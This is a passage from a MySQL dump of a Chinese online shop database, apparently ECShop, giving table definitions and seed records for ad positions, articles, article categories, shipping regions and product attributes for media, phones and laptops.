  PRIMARY KEY (`ad_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_ad_custom
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_ad_position`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_ad_position`;
CREATE TABLE `ec22703249_ad_position` (
  `position_id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `position_name` varchar(60) NOT NULL DEFAULT '',
  `ad_width` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ad_height` smallint(5) unsigned NOT NULL DEFAULT '0',
  `position_desc` varchar(255) NOT NULL DEFAULT '',
  `position_style` text NOT NULL,
  PRIMARY KEY (`position_id`)
) ENGINE=MyISAM AUTO_INCREMENT=31 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_ad_position
-- ----------------------------
INSERT INTO `ec22703249_ad_position` VALUES ('1', '首页轮播底部广告1', '230', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('2', '首页轮播底部广告2', '230', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('3', '首页轮播底部广告3', '230', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('4', '首页轮播底部广告4', '230', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('5', '首页新品上架广告1', '460', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('6', '首页新品上架广告2', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('7', '首页新品上架广告3', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('8', '首页新品上架广告4', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('9', '首页新品上架广告5', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('10', '首页新品上架广告6', '230', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('11', '首页新品上架广告7', '225', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('12', '首页新品上架广告8', '225', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('13', '首页新品上架广告9', '225', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('14', '首页热卖商品广告1', '460', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('15', '首页热卖商品广告2', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('16', '首页热卖商品广告3', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('17', '首页热卖商品广告4', '230', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('18', '首页热卖商品广告5', '225', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('19', '首页热卖商品广告6', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('20', '首页热卖商品广告7', '460', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('21', '首页热卖商品广告8', '230', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('22', '首页热卖商品广告9', '225', '150', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('23', '首页热卖商品广告10', '225', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('24', '首页热评商品广告', '460', '480', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('25', '首页热评商品文字说明', '1', '1', '', '{foreach from=$ads item=ad}\r\n{$ad}\r\n{/foreach}\r\n');
INSERT INTO `ec22703249_ad_position` VALUES ('27', '首页-分类ID1-广告1', '691', '180', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('26', '首页特卖商品广告', '460', '310', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('28', '首页-分类ID1-广告2', '231', '181', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('29', '导航右侧广告位', '215', '45', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');
INSERT INTO `ec22703249_ad_position` VALUES ('30', 'wap首页banner轮播', '480', '270', '', '<table cellpadding=\"0\" cellspacing=\"0\">\r\n{foreach from=$ads item=ad}\r\n<tr><td>{$ad}</td></tr>\r\n{/foreach}\r\n</table>');

-- ----------------------------
-- Table structure for `ec22703249_affiliate_log`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_affiliate_log`;
CREATE TABLE `ec22703249_affiliate_log` (
  `log_id` mediumint(8) NOT NULL AUTO_INCREMENT,
  `order_id` mediumint(8) NOT NULL,
  `time` int(10) NOT NULL,
  `user_id` mediumint(8) NOT NULL,
  `user_name` varchar(60) DEFAULT NULL,
  `money` decimal(10,2) NOT NULL DEFAULT '0.00',
  `point` int(10) NOT NULL DEFAULT '0',
  `separate_type` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`log_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_affiliate_log
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_agency`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_agency`;
CREATE TABLE `ec22703249_agency` (
  `agency_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `agency_name` varchar(255) NOT NULL,
  `agency_desc` text NOT NULL,
  PRIMARY KEY (`agency_id`),
  KEY `agency_name` (`agency_name`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_agency
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_area_region`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_area_region`;
CREATE TABLE `ec22703249_area_region` (
  `shipping_area_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `region_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`shipping_area_id`,`region_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_area_region
-- ----------------------------
INSERT INTO `ec22703249_area_region` VALUES ('1', '1');
INSERT INTO `ec22703249_area_region` VALUES ('2', '1');
INSERT INTO `ec22703249_area_region` VALUES ('3', '1');

-- ----------------------------
-- Table structure for `ec22703249_article`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_article`;
CREATE TABLE `ec22703249_article` (
  `article_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `cat_id` smallint(5) NOT NULL DEFAULT '0',
  `title` varchar(150) NOT NULL DEFAULT '',
  `content` longtext NOT NULL,
  `author` varchar(30) NOT NULL DEFAULT '',
  `author_email` varchar(60) NOT NULL DEFAULT '',
  `keywords` varchar(255) NOT NULL DEFAULT '',
  `article_type` tinyint(1) unsigned NOT NULL DEFAULT '2',
  `is_open` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `add_time` int(10) unsigned NOT NULL DEFAULT '0',
  `file_url` varchar(255) NOT NULL DEFAULT '',
  `open_type` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `link` varchar(255) NOT NULL DEFAULT '',
  `description` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`article_id`),
  KEY `cat_id` (`cat_id`)
) ENGINE=MyISAM AUTO_INCREMENT=24 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_article
-- ----------------------------
INSERT INTO `ec22703249_article` VALUES ('6', '-1', '用户协议', '', '', '', '', '0', '1', '1380510899', '', '0', '', '');
INSERT INTO `ec22703249_article` VALUES ('7', '4', '常见问题', '', '', '', '', '0', '1', '1380937690', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('8', '4', '订单状态', '', '', '', '', '0', '1', '1380937699', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('9', '4', '购买流程', '', '', '', '', '0', '1', '1380937711', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('10', '5', '在线支付', '', '', '', '', '0', '1', '1380937720', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('12', '5', '发票制度', '', '', '', '', '0', '1', '1380937745', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('13', '6', '冷链配送', '', '', '', '', '0', '1', '1380937753', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('15', '6', '配送的范围及费用', '', '', '', '', '0', '1', '1380937775', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('16', '7', '服务流程', '', '', '', '', '0', '1', '1380937782', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('18', '7', '服务政策', '', '', '', '', '0', '1', '1380937810', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('19', '8', '新品速递', '<p>dfgdssdgsdfffffffffffffffffffffffffffffffffffffffg</p>', '', '', '', '0', '1', '1381083295', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('20', '8', '君禾企业用户采购通道', '', '', '', '', '0', '1', '1381083304', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('21', '8', '君禾新网上线，豪送大礼！', '1111', '', '', '', '0', '1', '1381083315', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('22', '2', '乐享君禾慢生活', '<p>\r\n	&nbsp;<span style=\"color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;line-height:22px;\">尊敬的联盟会员，您好：</span>\r\n</p>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	&nbsp; &nbsp;&nbsp;\r\n</div>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	&nbsp; &nbsp;&nbsp;<a href=\"http://huati.weibo.com/k/%E9%9A%8F%E6%89%8B%E6%8B%8D%E7%99%BE%E5%BA%A6?from=501\"><span style=\"color:#0000FF;\">#随手拍百度#</span></a>拿百万话费过大年！1月24日至2月10日期间，只需拍下你身边的百度广告（手机百度、百度地图、百度手机卫士）发布图文微博并<a href=\"http://weibo.com/n/%E7%99%BE%E5%BA%A6?from=feed&loc=at\"><span style=\"color:#0000FF;\">@百度</span></a>&nbsp;（记得加上<a href=\"http://huati.weibo.com/k/%E9%9A%8F%E6%89%8B%E6%8B%8D%E7%99%BE%E5%BA%A6?from=501\"><span style=\"color:#0000FF;\">#随手拍百度#</span></a>哦），百度将每天随机揪出60名幸运儿送出600元话费大奖，获奖名单隔日公布。这等好消息还不快告诉你的亲朋好友？拿百万话费过大年啦！\r\n</div>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	&nbsp; &nbsp;&nbsp;<img src=\"http://union.baidu.com/upload/files/fck/image/c9f0ec22-c71a-4bcc-9862-551f7ded8836.JPG\" width=\"0\" height=\"0\" border=\"1\" alt=\"\" style=\"border:0px;\" />&nbsp; &nbsp;&nbsp;\r\n</div>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	&nbsp;\r\n</div>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	百度联盟——帮助合作伙伴在各自领域取得成功！ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\r\n</div>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	&nbsp; &nbsp; &nbsp; &nbsp;&nbsp;\r\n</div>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	百度联盟敬上!&nbsp;\r\n</div>\r\n<div style=\"border:0px;margin:0px;padding:0px;color:#666666;font-family:宋体, Arial, Helvetica, sans-serif;\">\r\n	2014年1月28日\r\n</div>', '', '', '', '0', '1', '1395101370', '', '0', 'http://', '');
INSERT INTO `ec22703249_article` VALUES ('23', '4', '会员卡协议', '这是会员卡协议', '', '', '', '0', '1', '1408333722', '', '0', 'http://', '');

-- ----------------------------
-- Table structure for `ec22703249_article_cat`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_article_cat`;
CREATE TABLE `ec22703249_article_cat` (
  `cat_id` smallint(5) NOT NULL AUTO_INCREMENT,
  `cat_name` varchar(255) NOT NULL DEFAULT '',
  `cat_type` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `keywords` varchar(255) NOT NULL DEFAULT '',
  `cat_desc` varchar(255) NOT NULL DEFAULT '',
  `sort_order` tinyint(3) unsigned NOT NULL DEFAULT '50',
  `show_in_nav` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `parent_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`cat_id`),
  KEY `cat_type` (`cat_type`),
  KEY `sort_order` (`sort_order`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_article_cat
-- ----------------------------
INSERT INTO `ec22703249_article_cat` VALUES ('1', '系统分类', '2', '', '系统保留分类', '50', '0', '0');
INSERT INTO `ec22703249_article_cat` VALUES ('2', '网店信息', '3', '', '网店信息分类', '50', '0', '1');
INSERT INTO `ec22703249_article_cat` VALUES ('3', '网店帮助分类', '4', '', '网店帮助分类', '50', '0', '1');
INSERT INTO `ec22703249_article_cat` VALUES ('4', '购物指南', '5', '', '', '50', '0', '3');
INSERT INTO `ec22703249_article_cat` VALUES ('5', '支付方式', '5', '', '', '50', '0', '3');
INSERT INTO `ec22703249_article_cat` VALUES ('6', '配送方式', '5', '', '', '50', '0', '3');
INSERT INTO `ec22703249_article_cat` VALUES ('7', '售后服务', '5', '', '', '50', '0', '3');
INSERT INTO `ec22703249_article_cat` VALUES ('8', '网站公告', '1', '', '', '50', '0', '0');

-- ----------------------------
-- Table structure for `ec22703249_attribute`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_attribute`;
CREATE TABLE `ec22703249_attribute` (
  `attr_id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `cat_id` smallint(5) unsigned NOT NULL DEFAULT '0',
  `attr_name` varchar(60) NOT NULL DEFAULT '',
  `attr_input_type` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `attr_type` tinyint(1) unsigned NOT NULL DEFAULT '1',
  `attr_values` text NOT NULL,
  `attr_index` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `sort_order` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `is_linked` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `attr_group` tinyint(1) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`attr_id`),
  KEY `cat_id` (`cat_id`)
) ENGINE=MyISAM AUTO_INCREMENT=212 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_attribute
-- ----------------------------
INSERT INTO `ec22703249_attribute` VALUES ('13', '2', '中文片名', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('14', '2', '英文片名', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('15', '2', '商品别名', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('16', '2', '介质/格式', '1', '0', 'HDCD\r\nDTS\r\nDVD\r\nDVD9\r\nVCD\r\nCD\r\nTAPE\r\nLP', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('17', '2', '片装数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('18', '2', '国家地区', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('19', '2', '语种', '1', '0', '中文\r\n英文\r\n法文\r\n西班牙文', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('20', '2', '导演/指挥', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('21', '2', '主唱', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('22', '2', '所属类别', '1', '0', '古典\r\n流行\r\n摇滚\r\n乡村\r\n民谣\r\n爵士\r\n蓝调\r\n电子\r\n舞曲\r\n国乐\r\n民族\r\n怀旧\r\n经典\r\n人声\r\n合唱\r\n发烧\r\n试音\r\n儿童\r\n胎教\r\n轻音乐\r\n世界音乐\r\n庆典音乐\r\n影视音乐\r\n新世纪音乐\r\n大自然音乐', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('23', '2', '长度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('24', '2', '歌词', '1', '0', '有\r\n无', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('25', '2', '碟片代码', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('26', '2', 'ISRC码', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('27', '2', '发行公司', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('28', '2', '出版', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('29', '2', '出版号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('30', '2', '引进号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('31', '2', '版权号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('32', '3', '中文片名', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('33', '3', '英文片名', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('34', '3', '商品别名', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('35', '3', '介质/格式', '1', '0', 'HDCD\r\nDTS\r\nDVD\r\nDVD9\r\nVCD', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('36', '3', '碟片类型', '1', '0', '单面\r\n双层', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('37', '3', '片装数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('38', '3', '国家地区', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('39', '3', '语种/配音', '1', '0', '中文\r\n英文\r\n法文\r\n西班牙文', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('40', '3', '字幕', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('41', '3', '色彩', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('42', '3', '中文字幕', '1', '0', '有\r\n无', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('43', '3', '导演', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('44', '3', '表演者', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('45', '3', '所属类别', '1', '0', '爱情\r\n偶像\r\n生活\r\n社会\r\n科幻\r\n神话\r\n武侠\r\n动作\r\n惊险\r\n恐怖\r\n传奇\r\n人物\r\n侦探\r\n警匪\r\n历史\r\n军事\r\n戏剧\r\n舞台\r\n经典\r\n名著\r\n喜剧\r\n情景\r\n动漫\r\n卡通\r\n儿童\r\n伦理激情', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('46', '3', '年份', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('47', '3', '音频格式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('48', '3', '区码', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('49', '3', '碟片代码', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('50', '3', 'ISRC码', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('51', '3', '发行公司', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('52', '3', '出版 ', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('53', '3', '出版号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('54', '3', '引进号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('55', '3', '版权号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('56', '4', '网络制式', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('57', '4', '支持频率/网络频率', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('58', '4', '尺寸体积', '1', '0', '   ', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('59', '4', '外观样式/手机类型', '1', '0', '翻盖\r\n滑盖\r\n直板\r\n折叠\r\n手写', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('60', '4', '主屏参数/内屏参数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('61', '4', '副屏参数/外屏参数', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('62', '4', '清晰度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('63', '4', '色数/灰度', '1', '0', '   ', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('64', '4', '长度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('65', '4', '宽度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('66', '4', '厚度', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('67', '4', '屏幕材质', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('68', '4', '内存容量', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('69', '4', '操作系统', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('70', '4', '通话时间', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('71', '4', '待机时间', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('72', '4', '标准配置', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('73', '4', 'WAP上网', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('74', '4', '数据业务', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('75', '4', '天线位置', '1', '0', '内置\r\n外置', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('76', '4', '随机配件', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('77', '4', '铃声', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('78', '4', '摄像头', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('79', '4', '彩信/彩e', '1', '0', '支持\r\n不支持', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('80', '4', '红外/蓝牙', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('81', '4', '价格等级', '1', '0', '高价机\r\n中价机\r\n低价机', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('82', '5', '型号', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('83', '5', '详细规格', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('84', '5', '笔记本尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('85', '5', '处理器类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('86', '5', '处理器最高主频', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('87', '5', '二级缓存', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('88', '5', '系统总线', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('89', '5', '主板芯片组', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('90', '5', '内存容量', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('91', '5', '内存类型', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('92', '5', '硬盘', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('93', '5', '屏幕尺寸', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('94', '5', '显示芯片', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('95', '5', '标称频率', '0', '0', '', '0', '0', '0', '0');
INSERT INTO `ec22703249_attribute` VALUES ('96', '5', '显卡显存', '0', '0', '', '0', '0', '0', '0');
